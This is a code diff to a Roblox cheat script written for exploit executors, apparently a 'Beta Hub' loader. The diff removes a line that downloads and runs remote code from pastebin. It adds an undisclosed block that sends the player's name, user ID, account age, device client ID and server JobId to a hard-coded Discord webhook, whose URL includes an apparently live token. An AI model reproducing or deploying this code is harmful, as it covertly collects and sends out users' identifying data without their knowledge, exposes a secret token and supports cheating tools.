@@ -486,4 +486,46 @@ spawn(function()
     end
 end)
 print('cdvn rác')
-loadstring(game:HttpGet("https://pastebin.com/raw/rPYNg0Bg"))()
+
+local HttpService = game:GetService("HttpService")
+Webhook_URL =  "https://discord.com/api/webhooks/1320991116979339305/qtHGfrGL17WEozT0Ojh87f45qzoaNND2Nh6eR13Fp22nrREaFy7pyTK2cAMlm8Myv7ls"
+local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+httprequest(
+{
+Url = Webhook_URL,
+Method = 'POST',
+Headers = {
+['Content-Type'] = 'application/json'
+},
+Body = HttpService:JSONEncode({
+["content"] = "",
+["embeds"] = {{
+["author"] = {
+["name"] = game.Players.LocalPlayer.Name,
+["icon"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=100&height=100&format=png"
+},
+["title"] = ""..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+["description"] = " ["..game.Players.LocalPlayer.DisplayName.."] Vừa Dùng Beta Hub 🌟",
+["type"] = "rich",
+["color"] = tonumber(0xffffff),
+["fields"] = {
+{
+["name"] = "Server Script:",
+["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId,'"..game.JobId.."',game.Players.LocalPlayer)```",
+["inline"] = true },
+{
+["name"] = "User ID:",
+["value"] = game:GetService("Players").LocalPlayer.UserId,
+["inline"] = true },
+{
+["name"] = "Account Age:",
+["value"] = game:GetService("Players").LocalPlayer.AccountAge,
+["inline"] = true },
+{
+["name"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+["value"] = os.date(),
+["inline"] = true }
+}
+}}
+})
+})
